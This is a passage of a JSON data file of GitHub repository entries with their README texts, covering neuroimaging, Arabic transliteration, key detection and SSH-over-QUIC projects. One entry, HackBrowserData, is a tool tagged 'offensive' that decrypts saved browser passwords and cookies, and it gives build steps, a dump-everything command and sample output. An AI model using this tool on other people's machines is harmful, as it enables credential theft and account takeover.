1.0.0\\n\\nFor full functionality, some functions require:\\n\\n- Matplotlib >= 2.1\\n- Mayavi >= 4.6\\n- PySurfer >= 0.8\\n- Scikit-learn >= 0.19.1\\n- Numba >= 0.40\\n- NiBabel >= 2.1.0\\n- Pandas >= 0.21\\n- Picard >= 0.3\\n- CuPy >= 4.0 (for NVIDIA CUDA acceleration)\\n- DIPY >= 0.10.1\\n- Imageio >= 2.6.1\\n- PyVista >= 0.24\\n\\nContributing to MNE-Python\\n^^^^^^^^^^^^^^^^^^^^^^^^^^\\n\\nPlease see the documentation on the MNE-Python homepage:\\n\\nhttps://mne.tools/dev/install/contributing.html\\n\\n\\nMailing list\\n^^^^^^^^^^^^\\n\\nhttp://mail.nmr.mgh.harvard.edu/mailman/listinfo/mne_analysis\\n\\n\\nLicensing\\n^^^^^^^^^\\n\\nMNE-Python is **BSD-licenced** (3 clause):\\n\\n This software is OSI Certified Open Source Software.\\n OSI Certified is a certification mark of the Open Source Initiative.\\n\\n Copyright (c) 2011-2019, authors of MNE-Python.\\n All rights reserved.\\n\\n Redistribution and use in source and binary forms, with or without\\n modification, are permitted provided that the following conditions are met:\\n\\n * Redistributions of source code must retain the above copyright notice,\\n this list of conditions and the following disclaimer.\\n\\n * Redistributions in binary form must reproduce the above copyright notice,\\n this list of conditions and the following disclaimer in the documentation\\n and/or other materials provided with the distribution.\\n\\n * Neither the names of MNE-Python authors nor the names of any\\n contributors may be used to endorse or promote products derived from\\n this software without specific prior written permission.\\n\\n **This software is provided by the copyright holders and contributors\\n \\\"as is\\\" and any express or implied warranties, including, but not\\n limited to, the implied warranties of merchantability and fitness for\\n a particular purpose are disclaimed. In no event shall the copyright\\n owner or contributors be liable for any direct, indirect, incidental,\\n special, exemplary, or consequential damages (including, but not\\n limited to, procurement of substitute goods or services; loss of use,\\n data, or profits; or business interruption) however caused and on any\\n theory of liability, whether in contract, strict liability, or tort\\n (including negligence or otherwise) arising in any way out of the use\\n of this software, even if advised of the possibility of such\\n damage.**\\n\\n\\n.. _MNE-Python software: https://mne.tools/dev/\\n.. _MNE documentation: https://mne.tools/dev/overview/index.html\\n.. _installation guide: https://mne.tools/dev/install/index.html\\n.. _pip: https://pip.pypa.io/en/stable/\\n\"", "topics": ["visualization", "neuroimaging", "meg", "statistics", "neuroscience", "ecog", "electrocorticography", "eeg", "electroencephalography", "magnetoencephalography"], "writeup": "", "ignoredescription": false, "id": 58, "full_name": "mne-tools/mne-python", "url": "https://github.com/mne-tools/mne-python", "topic_string": "visualization neuroimaging meg statistics neuroscience ecog electrocorticography eeg electroencephalography magnetoencephalography"},
{"tags": [], "owner": "MohamedHadjAmeur", "description": "ANETAC: Arabic Named Entity Transliteration and Classification Dataset", "name": "ANETAC", "topics_string": "", "language": "", "readme": "\"# ANETAC: Arabic Named Entity Transliteration and Classification Dataset\\n\\n## Description\\n\\nANETAC is an English-Arabic named entity transliteration and classification dataset (https://arxiv.org/abs/1907.03110) built from freely available parallel translation corpora. The dataset contains 79,924 English-Arabic named entities along with their respective classes that can be either a Person, a Location, or an Organization. \\n\\nAn example of the instances present in the dataset are provided in the below Table: \\n![Cat](https://github.com/MohamedHadjAmeur/ANETC-Arabic-Named-Entity-Transliteration-and-Classification-Dataset/blob/master/image.png)\\n\\n## CONTENTS\\n\\n\\nThis repository contains two folders:\\n* EN-AR NE: which contains the English-Arabic named entities along with their classes as described in the above table.\\n* EN-AR Translit: is a benchmark that splits the above-mentioned transliteration data into train, development, and test sets for direct usage in English-Arabic transliteration tasks.\\n\\nThe count of the Person, Location and Organization named entities that are present in this transliteration dataset are provided in the below Table: \\n![Cat](https://github.com/MohamedHadjAmeur/ANETC-Arabic-Named-Entity-Transliteration-and-Classification-Dataset/blob/master/stats.PNG)\\n\\n## Usage\\nWe note that first results using this EN-AR transliteration data (the one in EN-AR Translit folder) has been already published in the work of Hadj Ameur et al. \\\"Arabic Machine Transliteration using an Attention-based Encoder-decoder Model\\\".\\n\\n## Citations\\nIf you want to use the ANETAC dataset please cite the following arXiv paper:\\n\\n\\n```\\n@article{ameur2019anetac,\\n title={ANETAC: Arabic Named Entity Transliteration and Classification Dataset},\\n author={Ameur, Mohamed Seghir Hadj and Meziane, Farid and Guessoum, Ahmed},\\n journal={arXiv preprint arXiv:1907.03110},\\n year={2019}\\n}\\n```\\n\\n## Baseline Results\\n\\nThe baseline results that have been obtained when using ANETAC are reported in the following publication (you are welcomed to compare your own results to our baseline transliteration models):\\n\\n```\\n@article{HADJAMEUR2017287,\\ntitle = \\\"Arabic Machine Transliteration using an Attention-based Encoder-decoder Model\\\",\\njournal = \\\"Procedia Computer Science\\\",\\nvolume = \\\"117\\\",\\npages = \\\"287 - 297\\\",\\nyear = \\\"2017\\\",\\nnote = \\\"Arabic Computational Linguistics\\\",\\nissn = \\\"1877-0509\\\",\\ndoi = \\\"https://doi.org/10.1016/j.procs.2017.10.120\\\",\\nurl = \\\"http://www.sciencedirect.com/science/article/pii/S1877050917321774\\\",\\nauthor = \\\"Mohamed Seghir Hadj Ameur and Farid Meziane and Ahmed Guessoum\\\",\\nkeywords = \\\"Natural Language Processing, Arabic Language, Arabic Transliteration, Deep Learning, Sequence-to-sequence Models, Encoder-decoder Architecture, Recurrent Neural Networks\\\",\\nabstract = \\\"Transliteration is the process of converting words from a given source language alphabet to a target language alphabet, in a way that best preserves the phonetic and orthographic aspects of the transliterated words. Even though an important effort has been made towards improving this process for many languages such as English, French and Chinese, little research work has been accomplished with regard to the Arabic language. In this work, an attention-based encoder-decoder system is proposed for the task of Machine Transliteration between the Arabic and English languages. Our experiments proved the efficiency of our proposal approach in comparison to some previous research developed in this area.\\\"\\n}\\n```\\n\\n## Contacts:\\nFor all questions please contact ``mohamedhadjameur@gmail.com`` \\n\\n\"", "topics": ["dataset", "transliteration", "arabic"], "writeup": "", "ignoredescription": false, "id": 59, "full_name": "MohamedHadjAmeur/ANETAC", "url": "https://github.com/MohamedHadjAmeur/ANETAC", "topic_string": "dataset transliteration arabic"},
{"tags": [], "owner": "moonD4rk", "description": "Decrypt passwords/cookies/history/bookmarks from the browser. \u4e00\u6b3e\u53ef\u5168\u5e73\u53f0\u8fd0\u884c\u7684\u6d4f\u89c8\u5668\u6570\u636e\u5bfc\u51fa\u89e3\u5bc6\u5de5\u5177\u3002", "name": "HackBrowserData", "topics_string": "", "language": "Go", "readme": "\"# HackBrowserData\\n\\n[\\u4e2d\\u6587\\u6587\\u6863](https://github.com/moonD4rk/HackBrowserData/blob/master/README_ZH.md) \\n\\nhack-browser-data is an open-source tool that could help you decrypt data[passwords|bookmarks|cookies|history] from the browser. It supports the most popular browsers on the market and runs on Windows, macOS and Linux.\\n\\n### Supported Browser\\n\\n#### Windows\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Google Chrome (Full Version) | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Microsoft Edge | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| 360 Speed Browser | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| QQ Browser | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Internet Explorer | \\u274c | \\u274c | \\u274c | \\u274c |\\n\\n#### MacOS\\n\\nBecause of the security policies, some of the browsers require a password.\\n\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Google Chrome<br />Require Password | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Microsoft Edge<br />Require Password | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Safari | \\u274c | \\u274c | \\u274c | \\u274c |\\n\\n#### Linux\\n\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Google Chrome | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n\\n\\n### Install\\n\\nInstallation of hack-browser-data is dead-simple, just download [the release for your system](https://github.com/moonD4rk/HackBrowserData/releases) and run the binary.\\n\\n#### Building from source\\n\\nsupport `go 1.11+`\\n\\n```bash\\ngit clone https://github.com/moonD4rk/HackBrowserData\\n\\ncd HackBrowserData\\n\\ngo get -v -t -d ./...\\n\\ngo build\\n```\\n\\n#### Run\\n\\n```shell\\nPS C:\\\\test> .\\\\hack-browser-data.exe -h\\nNAME:\\n hack-browser-data - Export passwords/cookies/history/bookmarks from browser\\n\\nUSAGE:\\n [hack-browser-data -b chrome -f json -dir results -e all -cc]\\n Get all data(password/cookie/history/bookmark) from chrome\\n\\nGLOBAL OPTIONS:\\n --verbose, --vv Verbose (default: false)\\n --compress, --cc Compress result to zip (default: false)\\n --browser value, -b value Available browsers: all|chrome|edge|firefox (default: \\\"all\\\")\\n --results-dir value, --dir value Export dir (default: \\\"results\\\")\\n --format value, -f value Format, csv|json|console (default: \\\"json\\\")\\n --export-data value, -e value all|password|bookmark|cookie|history (default: \\\"all\\\")\\n --help, -h show help (default: false)\\n\\n\\nPS C:\\\\test> .\\\\hack-browser-data.exe -b all -f json -e all --dir results -cc\\n[x]: Get 44 cookies, filename is results/microsoft_edge_cookie.json\\n[x]: Get 54 history, filename is results/microsoft_edge_history.json\\n[x]: Get 1 passwords, filename is results/microsoft_edge_password.json\\n[x]: Get 4 bookmarks, filename is results/microsoft_edge_bookmark.json\\n[x]: Get 6 bookmarks, filename is results/360speed_bookmark.json\\n[x]: Get 19 cookies, filename is results/360speed_cookie.json\\n[x]: Get 18 history, filename is results/360speed_history.json\\n[x]: Get 1 passwords, filename is results/360speed_password.json\\n[x]: Get 12 history, filename is results/qq_history.json\\n[x]: Get 1 passwords, filename is results/qq_password.json\\n[x]: Get 12 bookmarks, filename is results/qq_bookmark.json\\n[x]: Get 14 cookies, filename is results/qq_cookie.json\\n[x]: Get 28 bookmarks, filename is results/firefox_bookmark.json\\n[x]: Get 10 cookies, filename is results/firefox_cookie.json\\n[x]: Get 33 history, filename is results/firefox_history.json\\n[x]: Get 1 passwords, filename is results/firefox_password.json\\n[x]: Get 1 passwords, filename is results/chrome_password.json\\n[x]: Get 4 bookmarks, filename is results/chrome_bookmark.json\\n[x]: Get 6 cookies, filename is results/chrome_cookie.json\\n[x]: Get 6 history, filename is results/chrome_history.json\\n[x]: Compress success, zip filename is results/archive.zip\\n```\\n\\n\\n### TODO\\n\\n[Desktop Browser Market Share Worldwide](https://gs.statcounter.com/browser-market-share/desktop/worldwide)\\n\\n| Chrome | Safari | Firefox | Edge Legacy | IE | Other |\\n| :------:| :------: | :----: | :------: | :-----: | :--: |\\n| 68.33% | 9.4% | 8.91% | 4.41% | 3% | 3% |\\n\\n[Desktop Browser Market Share China](https://gs.statcounter.com/browser-market-share/desktop/china)\\n\\n| Chrome | 360 Safe | Firefox | QQ Browser | IE | Sogou Explorer |\\n| :----- | :------: | :-----: | :--------: | :---: | :------------: |\\n| 39.85% | 22.26% | 9.28% | 6.5% | 5.65% | 4.74% |\\n\\n \\n\\n- [x] Chrome\\n- [x] QQ browser\\n- [x] Edge\\n- [x] 360 speed browser\\n- [x] Firefox\\n- [ ] Safari\\n- [ ] IE\"", "topics": ["edge", "browser", "offensive", "firefox", "windows", "chrome", "macos"], "writeup": "hack-browser-data is an open-source tool that could help you decrypt data[passwords|bookmarks|cookies|history] from the browser. It supports the most popular browsers on the market and runs on Windows, macOS and Linux.", "ignoredescription": false, "id": 60, "full_name": "moonD4rk/HackBrowserData", "url": "https://github.com/moonD4rk/HackBrowserData", "topic_string": "edge browser offensive firefox windows chrome macos"},
{"tags": [], "owner": "moul", "description": "Automatically detect and parse cryptography keys", "name": "cryptoguess", "topics_string": "", "language": "Go", "readme": "\"# cryptoguess\\n\\n:smile: cryptoguess automatically detects and parses cryptography keys from files\\n\\n[![CircleCI](https://circleci.com/gh/moul/cryptoguess.svg?style=shield)](https://circleci.com/gh/moul/cryptoguess)\\n[![GoDoc](https://godoc.org/moul.io/cryptoguess?status.svg)](https://godoc.org/moul.io/cryptoguess)\\n[![License](https://img.shields.io/github/license/moul/cryptoguess.svg)](https://github.com/moul/cryptoguess/blob/master/LICENSE)\\n[![GitHub release](https://img.shields.io/github/release/moul/cryptoguess.svg)](https://github.com/moul/cryptoguess/releases)\\n[![Go Report Card](https://goreportcard.com/badge/moul.io/cryptoguess)](https://goreportcard.com/report/moul.io/cryptoguess)\\n[![CodeFactor](https://www.codefactor.io/repository/github/moul/cryptoguess/badge)](https://www.codefactor.io/repository/github/moul/cryptoguess)\\n[![codecov](https://codecov.io/gh/moul/cryptoguess/branch/master/graph/badge.svg)](https://codecov.io/gh/moul/cryptoguess)\\n[![Docker Metrics](https://images.microbadger.com/badges/image/moul/cryptoguess.svg)](https://microbadger.com/images/moul/cryptoguess)\\n[![Made by Manfred Touron](https://img.shields.io/badge/made%20by-Manfred%20Touron-blue.svg?style=flat)](https://manfred.life/)\\n\\n\\n## Usage\\n\\n```console\\n$ find test/ -type f | xargs cryptoguess\\ntest/pem-rsa-pubkey.txt: potential candidates: PEM encoded data: x509: DER encoded public key, PEM encoded data\\ntest/jwt-token.txt: JWT signed token\\ntest/ssh-rsa-authorized-key.txt: SSH authorized key\\ntest/rsa-pubkey.txt: potential candidates: BASE64 encoded data: x509: DER encoded public key, BASE64 encoded data\\ntest/crypto-memory/D.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/E: PEM encoded data\\ntest/crypto-memory/A.pub: SSH authorized key\\ntest/crypto-memory/A: PEM encoded data\\ntest/crypto-memory/B.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/B.pub: SSH authorized key\\ntest/crypto-memory/D.with-password: PEM encoded data\\ntest/crypto-memory/C.pub: SSH authorized key\\ntest/crypto-memory/D: potential candidates: PEM encoded data: x509: PKCS#1 private key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/D.pub: SSH authorized key\\ntest/crypto-memory/A.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/B: PEM encoded data\\ntest/crypto-memory/C: PEM encoded data\\ntest/crypto-memory/B.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/F.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/D.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/F.pub: SSH authorized key\\ntest/crypto-memory/A.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/F.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\n```\\n\\n```console\\n$ find test/ -type f | xargs file\\ntest/pem-rsa-pubkey.txt: ASCII text\\ntest/jwt-token.txt: ASCII text, with very long lines, with no line terminators\\ntest/ssh-rsa-authorized-key.txt: OpenSSH RSA public key\\ntest/rsa-pubkey.txt: ASCII text, with very long lines, with no line terminators\\ntest/crypto-memory/D.der: data\\ntest/crypto-memory/E: OpenSSH private key\\ntest/crypto-memory/A.pub: OpenSSH RSA public key\\ntest/crypto-memory/A: OpenSSH private key\\ntest/crypto-memory/B.pem: ASCII text\\ntest/crypto-memory/B.pub: OpenSSH RSA public key\\ntest/crypto-memory/D.with-password: PEM RSA private key\\ntest/crypto-memory/C.pub: OpenSSH ED25519 public key\\ntest/crypto-memory/D: PEM RSA private key\\ntest/crypto-memory/D.pub: OpenSSH RSA public key\\ntest/crypto-memory/A.der: data\\ntest/crypto-memory/B: OpenSSH private key\\ntest/crypto-memory/C: OpenSSH private key\\ntest/crypto-memory/B.der: data\\ntest/crypto-memory/F.pem: ASCII text\\ntest/crypto-memory/D.pem: ASCII text\\ntest/crypto-memory/F.pub: OpenSSH RSA public key\\ntest/crypto-memory/A.pem: ASCII text\\ntest/crypto-memory/F.der: data\\n```\\n\\n---\\n\\n```console\\n$ cryptoguess --debug test/ssh-rsa-authorized-key.txt\\ntest/ssh-rsa-authorized-key.txt: SSH authorized key\\n- PEM encoded data: err: no PEM data found\\n- SSH authorized key: *cryptoguess.ParsedSSHAuthorizedKey: &{0xc00005c8c0 lorem ipsum []}\\n- x509 DER encoded public key: err: asn1: structure error: tags don't match (16 vs {class:1 tag:19 length:115 isCompound:true}) {optional:false explicit:false application:false private:false defaultValue:<nil> tag:<nil> stringType:0 timeType:0 set:false omitEmpty:false} publicKeyInfo @2\\n```\\n\\n---\\n\\n```console\\n$ cryptoguess -h\\nNAME:\\n cryptoguess - A new cli application\\n\\nUSAGE:\\n cryptoguess [global options] command [command options] [arguments...]\\n\\nVERSION:\\n 0.0.0\\n\\nCOMMANDS:\\n help, h Shows a list of commands or help for one command\\n\\nGLOBAL OPTIONS:\\n --debug, -D (default: false)\\n --list, -l (default: false)\\n --help, -h show help (default: false)\\n --version, -v print the version (default: false)\\n```\\n\\n## Decoders\\n\\n| Encoding | Status | Recursive |\\n|----------------------------------|--------------------|--------------------|\\n| aes | :red_circle: | :red_circle: |\\n| ascii85 | :red_circle: | :red_circle: |\\n| asn1 | :red_circle: | :red_circle: |\\n| base32 | :red_circle: | :red_circle: |\\n| base64 | :white_check_mark: | :white_check_mark: |\\n| cipher | :red_circle: | :red_circle: |\\n| csv | :red_circle: | :red_circle: |\\n| des | :red_circle: | :red_circle: |\\n| dsa | :red_circle: | :red_circle: |\\n| ecdsa | :red_circle: | :red_circle: |\\n| elliptic | :red_circle: | :red_circle: |\\n| encodings (utf-8) | :red_circle: | :red_circle: |\\n| encrypted jwt | :red_circle: | :red_circle: |\\n| gob | :red_circle: | :red_circle: |\\n| gzip,lzw,... | :red_circle: | :red_circle: |\\n| json | :red_circle: | :red_circle: |\\n| pem | :white_check_mark: | :white_check_mark: |\\n| rsa | :red_circle: | :red_circle: |\\n| signed jwt | :white_check_mark: | :red_circle: |\\n| ssh | :white_check_mark: | :red_circle: |\\n| tls | :red_circle: | :red_circle: |\\n| url escaped | :red_circle: | :red_circle: |\\n| x509: DER certificate list | :white_check_mark: | n/a |\\n| x509: Elliptic Curve private key | :white_check_mark: | n/a |\\n| x509: PKCS#1 RSA private key | :white_check_mark: | n/a |\\n| x509: PKCS#8 private key | :white_check_mark: | n/a |\\n| x509: PKCS#8 public key | :white_check_mark: | n/a |\\n| x509: PKIX public key | :white_check_mark: | n/a |\\n| x509: certificate | :white_check_mark: | n/a |\\n| x509: certificate list | :white_check_mark: | n/a |\\n| x509: certificate request | :white_check_mark: | n/a |\\n| x509: certificates | :white_check_mark: | n/a |\\n| xml | :red_circle: | :red_circle: |\\n\\n\\n## Install\\n\\n### CLI\\n\\n```console\\n$ go get -u moul.io/cryptoguess\\n```\\n\\n### Library\\n\\n```console\\n$ go get -u moul.io/cryptoguess/cryptoguess\\n```\\n\\n## As a library\\n\\nSee https://godoc.org/moul.io/cryptoguess/cryptoguess\\n\\n## License\\n\\n\\u00a9 2019 [Manfred Touron](https://manfred.life) -\\n[Apache-2.0 License](https://github.com/moul/cryptoguess/blob/master/LICENSE)\\n\"", "topics": ["hash", "decode", "decoder", "tool", "forensic", "cryptography", "guess"], "writeup": "", "ignoredescription": false, "id": 61, "full_name": "moul/cryptoguess", "url": "https://github.com/moul/cryptoguess", "topic_string": "hash decode decoder tool forensic cryptography guess"},
{"tags": [], "owner": "moul", "description": "SSH over QUIC", "name": "quicssh", "topics_string": "", "language": "Go", "readme": "\"# quicssh\\n\\n> :smile: **quicssh** is a QUIC proxy that allows to use QUIC to connect to an SSH server without needing to patch the client or the server.\\n\\n[![CircleCI](https://circleci.com/gh/moul/quicssh.svg?style=shield)](https://circleci.com/gh/moul/quicssh)\\n[![GoDoc](https://godoc.org/moul.io/quicssh?status.svg)](https://godoc.org/moul.io/quicssh)\\n[![License](https://img.shields.io/github/license/moul/quicssh.svg)](https://github.com/moul/quicssh/blob/master/LICENSE)\\n[![GitHub release](https://img.shields.io/github/release/moul/quicssh.svg)](https://github.com/moul/quicssh/releases)\\n[![Go Report Card](https://goreportcard.com/badge/moul.io/quicssh)](https://goreportcard.com/report/moul.io/quicssh)\\n[![Docker Metrics](https://images.microbadger.com/badges/image/moul/quicssh.svg)](https://microbadger.com/images/moul/quicssh)\\n[![Made by Manfred Touron](https://img.shields.io/badge/made%20by-Manfred%20Touron-blue.svg?style=flat)](https://manfred.life/)\\n\\n## Architecture\\n\\nStandard SSH connection\\n\\n```\\n\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\n\\u2502 bob \\u2502 \\u2502 wopr \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502\\n\\u2502 \\u2502 ssh user@wopr \\u2502\\u2500\\u253c\\u2500\\u2500\\u2500\\u2500tcp\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u253c\\u25b6\\u2502 sshd \\u2502 \\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502\\n\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\n```\\n\\n---\\n\\nSSH Connection proxified with QUIC\\n\\n```\\n\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\n\\u2502 bob \\u2502 \\u2502 wopr \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502\\n\\u2502 \\u2502ssh -o ProxyCommand \\\"quicssh client\\u2502 \\u2502 \\u2502 \\u2502 sshd \\u2502 \\u2502\\n\\u2502 \\u2502 --addr %h:4545\\\" user@wopr \\u2502 \\u2502 \\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u25b2 \\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 process \\u2502 \\u2502 tcp to localhost:22 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u25bc \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\u2502\\n\\u2502 \\u2502 quicssh client --addr wopr:4545 \\u2502\\u2500\\u253c\\u2500quic (udp)\\u2500\\u2500\\u25b6\\u2502 quicssh server \\u2502\\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\u2502\\n\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\n```\\n\\n## Usage\\n\\n```console\\n$ quicssh -h\\nNAME:\\n quicssh - A new cli application\\n\\nUSAGE:\\n quicssh [global options] command [command options] [arguments...]\\n\\nVERSION:\\n 0.0.0\\n\\nCOMMANDS:\\n server\\n client\\n help, h Shows a list of commands or help for one command\\n\\nGLOBAL OPTIONS:\\n --help, -h show help (default: false)\\n --version, -v print the version (default: false)\\n ```\\n\\n### Client\\n\\n```console\\n$ quicssh client -h\\nNAME:\\n quicssh client -\\n\\nUSAGE:\\n quicssh client [command options] [arguments...]\\n\\nOPTIONS:\\n --addr value (default: \\\"localhost:4242\\\")\\n --help, -h show help (default: false)\\n```\\n\\n### Server\\n\\n```console\\n$ quicssh server -h\\nNAME:\\n quicssh server -\\n\\nUSAGE:\\n quicssh server [command options] [arguments...]\\n\\nOPTIONS:\\n --bind value (default: \\\"localhost:4242\\\")\\n --help, -h show help (default: false)\\n```\\n\\n## Install\\n\\n```console\\n$ go get -u moul.io/quicssh\\n```\\n\\n## License\\n\\n\\u00a9 2019 [Manfred Touron](https://manfred.life) -\\n[Apache-2.0 License](https://github.com/moul/quicssh/blob/master/LICENSE)\\n\"", "topics": ["server", "offensive", "quic", "cli", "proxy", "ssh", "daemon"], "writeup": 